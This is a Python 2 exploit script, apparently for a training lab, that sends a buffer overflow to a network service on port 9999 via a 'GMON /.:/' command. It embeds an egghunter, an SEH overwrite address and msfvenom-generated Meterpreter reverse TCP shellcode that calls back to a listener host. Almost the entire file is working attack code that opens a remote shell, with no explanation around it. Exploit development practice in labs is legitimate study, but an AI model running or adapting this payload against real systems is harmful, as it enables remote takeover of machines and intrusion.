#!/usr/bin/python
import socket
from struct import pack

host = '172.16.192.168'
port = 9999
max_size = 5000

egghunter = ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e"
			"\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa"
			"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.192.192 LPORT=7887 
# -b "\x00\x0a\x0d" -a x86 --platform windows -f python -v rev_met_7887

rev_met_7887 =  "w00tw00t"
rev_met_7887 += "\xd9\xf6\xba\x48\xa2\xf9\xa4\xd9\x74\x24\xf4"
rev_met_7887 += "\x5d\x33\xc9\xb1\x56\x31\x55\x18\x83\xc5\x04"
rev_met_7887 += "\x03\x55\x5c\x40\x0c\x58\xb4\x06\xef\xa1\x44"
rev_met_7887 += "\x67\x79\x44\x75\xa7\x1d\x0c\x25\x17\x55\x40"
rev_met_7887 += "\xc9\xdc\x3b\x71\x5a\x90\x93\x76\xeb\x1f\xc2"
rev_met_7887 += "\xb9\xec\x0c\x36\xdb\x6e\x4f\x6b\x3b\x4f\x80"
rev_met_7887 += "\x7e\x3a\x88\xfd\x73\x6e\x41\x89\x26\x9f\xe6"
rev_met_7887 += "\xc7\xfa\x14\xb4\xc6\x7a\xc8\x0c\xe8\xab\x5f"
rev_met_7887 += "\x07\xb3\x6b\x61\xc4\xcf\x25\x79\x09\xf5\xfc"
rev_met_7887 += "\xf2\xf9\x81\xfe\xd2\x30\x69\xac\x1a\xfd\x98"
rev_met_7887 += "\xac\x5b\x39\x43\xdb\x95\x3a\xfe\xdc\x61\x41"
rev_met_7887 += "\x24\x68\x72\xe1\xaf\xca\x5e\x10\x63\x8c\x15"
rev_met_7887 += "\x1e\xc8\xda\x72\x02\xcf\x0f\x09\x3e\x44\xae"
rev_met_7887 += "\xde\xb7\x1e\x95\xfa\x9c\xc5\xb4\x5b\x78\xab"
rev_met_7887 += "\xc9\xbc\x23\x14\x6c\xb6\xc9\x41\x1d\x95\x85"
rev_met_7887 += "\xa6\x2c\x26\x55\xa1\x27\x55\x67\x6e\x9c\xf1"
rev_met_7887 += "\xcb\xe7\x3a\x05\x5a\xef\xbc\xd9\xe4\x60\x43"
rev_met_7887 += "\xda\x14\xa8\x80\x8e\x44\xc2\x21\xaf\x0f\x12"
rev_met_7887 += "\xcd\x7a\xa5\x18\x59\x29\x29\xdd\x59\x59\x4b"
rev_met_7887 += "\xdd\x47\x55\xc2\x3b\x27\x39\x84\x93\x88\xe9"
rev_met_7887 += "\x64\x44\x61\xe0\x6b\xbb\x91\x0b\xa6\xd4\x38"
rev_met_7887 += "\xe4\x1e\x8c\xd4\x9d\x3b\x46\x44\x61\x96\x22"
rev_met_7887 += "\x46\xe9\x12\xd2\x09\x1a\x57\xc0\x7e\x7d\x97"
rev_met_7887 += "\x18\x7f\xe8\x97\x72\x7b\xba\xc0\xea\x81\x9b"
rev_met_7887 += "\x26\xb5\x7a\xce\x35\xb2\x85\x8f\x0f\xc8\xb0"
rev_met_7887 += "\x05\x2f\xa6\xbc\xc9\xaf\x36\xeb\x83\xaf\x5e"
rev_met_7887 += "\x4b\xf0\xfc\x7b\x94\x2d\x91\xd7\x01\xce\xc3"
rev_met_7887 += "\x84\x82\xa6\xe9\xf3\xe5\x68\x12\xd6\x75\x6e"
rev_met_7887 += "\xec\xa4\x51\xd7\x84\x56\xe2\xe7\x54\x3d\xe2"
rev_met_7887 += "\xb7\x3c\xca\xcd\x38\x8c\x33\xc4\x10\x84\xbe"
rev_met_7887 += "\x89\xd3\x35\xbe\x83\xb2\xeb\xbf\x20\x6f\x1c"
rev_met_7887 += "\xc5\x49\x90\xdd\x3a\x40\xf5\xde\x3a\x6c\x0b"
rev_met_7887 += "\xe3\xec\x55\x79\x22\x2d\xe2\x72\x11\x10\x43"
rev_met_7887 += "\x19\x59\x06\x93\x08"

payload = "\x90" * 50
payload += rev_met_7887
payload += "A" * (3369 - len(rev_met_7887) - 50) 
payload += egghunter
payload += "B" * (126 - len(egghunter))
payload += "\xEB\x80\x90\x90"
payload += pack("<L",0x625010b4)
payload += "D" * (max_size - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print s.recv(1024)
print "[*] Sending payload of size: {0} chars...".format(len(payload))
s.send("GMON /.:/" + payload + "\r\n")
s.close()
